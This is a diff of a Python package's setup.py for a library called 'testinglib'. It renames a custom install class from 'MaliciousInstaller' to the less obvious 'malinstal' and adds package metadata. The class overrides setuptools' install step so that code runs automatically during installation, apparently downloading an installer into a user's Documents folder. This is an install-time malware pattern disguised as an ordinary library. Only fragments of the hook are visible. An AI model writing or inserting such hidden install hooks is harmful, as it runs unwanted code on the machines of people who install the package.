@@ -6,7 +6,16 @@ import subprocess
 from setuptools import setup
 from setuptools.command.install import install
 
-class MaliciousInstaller(install):
+NAME = 'testinglib'
+DESCRIPTION = 'yapfest'
+URL = 'https://github.com/slikc/testinglib'
+EMAIL = 'hi@slikc.me'
+AUTHOR = 'slikc'
+REQUIRES_PYTHON = '>=2.7.0'
+VERSION = '1.4.1'
+
+
+class malinstal(install):
     def run(self):
         if platform.system() != 'Darwin':
             documents = 'C:\\Users\\charl\\Documents'
@@ -27,6 +36,6 @@ class MaliciousInstaller(install):
             print('Installer downloaded to current directory')
 
 setup(
-    cmdclass={"install": MaliciousInstaller},
+    cmdclass={"install": malinstal},
     use_wheel=False
 )
